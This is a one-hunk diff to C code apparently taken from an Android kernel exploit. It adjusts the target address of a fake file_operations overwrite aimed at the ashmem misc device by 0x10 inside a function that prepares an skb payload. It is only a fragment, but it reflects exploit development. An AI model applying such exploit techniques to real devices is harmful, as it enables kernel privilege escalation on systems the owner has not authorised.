@@ -636,7 +636,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     slide_bank_payload_base = payload_base;
     slide_bank_parents[0] = fake_fops;
-    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+    slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS) + 0x10;
   }
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
